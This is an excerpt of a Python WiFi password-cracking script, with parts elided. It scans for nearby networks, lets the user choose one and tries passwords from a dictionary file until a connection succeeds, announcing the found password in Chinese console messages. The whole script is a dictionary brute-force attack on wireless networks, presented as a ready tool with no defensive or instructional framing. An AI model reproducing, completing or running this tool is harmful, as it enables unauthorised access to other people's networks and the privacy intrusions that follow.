...
def wifi_scan():
    ...
    for i in range(delays):
        print('\r扫描可用 WiFi 中，请稍后。。。（' + str(delays - i), end='）')
        time.sleep(1)
    print('\r扫描完成！\n' + '-' * 38)
    ...
    for w in bss:
        ...
        #wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape'))
...
def wifi_password_crack(wifi_name):
    ...
    with open(wifi_dic_path, 'r') as f:
        ...
        for pwd in f:
            ...
            profile.ssid = wifi_name.encode('utf-8').decode('gbk','ignore')
            # 需要认证
            ...
            while time.time() - start_time < 1.5:
                ...
                if interface.status() == 4:
                    print(f'尝试第 {count} 连接成功！{wifi_name} 的密码是: {pwd}')
                    exit(0)
                else:
                    if(count != count1):
                        count1 = count1 + 1
                        print(f'第 {count} 次尝试破解 {wifi_name}， 使用此密码: {pwd} 连接失败', end='\n')
                    # print(f'\r正在尝试破解。', end='')
    ...
    while not exit_flag:
        try:
            ...
            while not choose_exit_flag:
                try:
                    target_num = int(input('请选择你要尝试破解的wifi编号：'))
